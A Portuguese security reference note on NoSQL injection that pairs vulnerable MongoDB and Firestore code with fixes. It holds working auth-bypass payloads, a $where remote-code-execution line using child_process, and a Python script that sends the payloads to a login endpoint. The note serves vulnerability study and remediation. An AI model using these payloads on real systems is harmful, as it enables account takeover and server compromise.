# NoSQL Injection

**Tags:** #critico #nosql #mongodb #firebase #injecao #auth-bypass
**OWASP:** A03:2021 — Injection
**CVSS Base:** 9.8 (Crítico — bypass de autenticação com operadores MongoDB)

---

## 📖 O que é

NoSQL databases (MongoDB, CouchDB, Firebase/Firestore) têm sua própria gramática de operações de query que pode ser injetada quando input do usuário é passado diretamente para métodos de consulta sem sanitização.

---

## 🔍 `grep_search` Táticas

```
find({
findOne({
req.body
req.query
$where
$gt
$lt
$ne
$in
$regex
mongoose
mongo-sanitize
express-mongo-sanitize
firestore.rules
allow read, write
```

---

## 💣 MongoDB Operator Injection

### Bypass de Autenticação com `$gt`

**Código Vulnerável:**
```javascript
// ❌ VULNERÁVEL — req.body passado direto ao findOne()
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({ username, password });  // body injetado!
    if (user) {
        res.json({ token: generateToken(user) });
    } else {
        res.status(401).json({ error: 'Credenciais inválidas' });
    }
});
```

**Exploit — Injeção via JSON body:**
```json
{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
}
```

**Query resultante no MongoDB:**
```javascript
// $gt: "" significa "maior que string vazia" → todos os documentos passam!
db.users.findOne({ username: {$gt: ""}, password: {$gt: ""} })
// Retorna o PRIMEIRO usuário (geralmente admin) sem verificar senha
```

---

### Outros Operadores de Bypass

```json
// $regex — casa qualquer senha
{
    "username": "admin",
    "password": {"$regex": ".*"}
}

// $ne — "diferente de null" = tudo
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}

// $in — lista de possíveis valores
{
    "username": {"$in": ["admin", "administrator", "root"]},
    "password": {"$ne": ""}
}
```

---

### `$where` — JavaScript Server-Side Execution

```json
{
    "username": "admin",
    "$where": "function() { return true; }"
}
```

**Mais perigoso — sleep para detecção time-based:**
```json
{
    "$where": "function() { sleep(5000); return true; }"
}
```

**RCE se `javascriptEnabled: true` no MongoDB:**
```json
{
    "$where": "function() { return require('child_process').execSync('id').toString(); }"
}
```

---

### Injeção via Query String (GET parameters)

```
# URL com operador NoSQL
GET /api/users?username[$gt]=&password[$gt]=
GET /api/users?username[$ne]=null
```

**Código vulnerável:**
```javascript
// ❌ VULNERÁVEL — req.query passado direto
User.find(req.query)  // query string completa como filtro!
```

---

## 💣 Firebase / Firestore — Regras Inseguras

```javascript
// ❌ CRÍTICO — banco inteiro público
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;  // QUALQUER PESSOA LÊ E ESCREVE
    }
  }
}
```

```javascript
// ❌ ALTO — sem autenticação requerida
match /users/{userId} {
    allow read: if true;         // dados de todos os usuários públicos
    allow write: if true;        // qualquer pessoa modifica qualquer usuário
}
```

```javascript
// ✅ CORRETO — autenticação e ownership
match /users/{userId} {
    allow read: if request.auth != null && request.auth.uid == userId;
    allow write: if request.auth != null && request.auth.uid == userId;
}
```

---

## 🧪 Script de Validação

```python
# .tmp/validate_nosqli.py
import requests, json

TARGET = "http://target.com"
ENDPOINT = "/api/login"

PAYLOADS = [
    # Operador injection
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin", "password": {"$regex": ".*"}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
    # $where time-based (detecta por tempo de resposta lento)
    {"username": "admin", "$where": "function(){sleep(3000);return true;}"},
]

for payload in PAYLOADS:
    import time
    start = time.time()
    try:
        r = requests.post(f"{TARGET}{ENDPOINT}",
                         json=payload,
                         headers={"Content-Type": "application/json"},
                         timeout=10)
        elapsed = time.time() - start
        
        has_token = 'token' in r.text.lower() or 'session' in r.text.lower()
        is_slow = elapsed >= 2.5  # $where sleep
        
        if has_token:
            print(f"[🔴 CRÍTICO] Auth Bypass via NoSQLi: {json.dumps(payload)}")
            print(f"  Response: {r.text[:200]}")
        elif is_slow:
            print(f"[🔴 CRÍTICO] Time-based NoSQLi ($where): elapsed={elapsed:.1f}s")
        else:
            print(f"[ok] {json.dumps(payload)} - {r.status_code} ({elapsed:.1f}s)")
    except Exception as e:
        print(f"[error] {e}")
```

---

## 🛡️ Correção

### Sanitização de Input com `express-mongo-sanitize`

```javascript
// ✅ CORRETO — sanitizar req.body e req.query
const mongoSanitize = require('express-mongo-sanitize');

app.use(mongoSanitize({
    replaceWith: '_',  // substituir $ e . por _
}));

// Opcionalmente, modo estrito que remove completamente operators
app.use(mongoSanitize());
```

### Validação com Schema (Joi/Yup)

```javascript
// ✅ CORRETO — validar que os campos são strings
const Joi = require('joi');

const loginSchema = Joi.object({
    username: Joi.string().required(),  // garante que é string, não objeto
    password: Joi.string().required(),
});

app.post('/login', async (req, res) => {
    const { error, value } = loginSchema.validate(req.body);
    if (error) return res.status(400).json({ error: error.message });
    
    const { username, password } = value;  // strings validadas
    const user = await User.findOne({ username, password: hashPassword(password) });
    // ...
});
```

### Desabilitar `$where` no MongoDB

```javascript
// mongodb.conf
javascriptEnabled: false
```

---

## 🔗 Chain Exploits

```
NoSQL Injection Auth Bypass → Admin access → Dump completo do banco
MongoDB $where RCE → Comprometimento total do servidor do banco
Firebase regras abertas → Dump de todos os dados de usuários → LGPD violação
NoSQL Injection + campo de role → Escalação de privilégio no filtro
Time-based NoSQLi + enumeração → Dump de usernames válidos para credential stuffing
```

---

## 📌 Referências
- [[SQL Injection (SQLi)]]
- [[GraphQL — Superfície de Ataque]]
- [[Autenticação & Gestão de Sessão]]
- [HackTricks NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayloadsAllTheThings NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
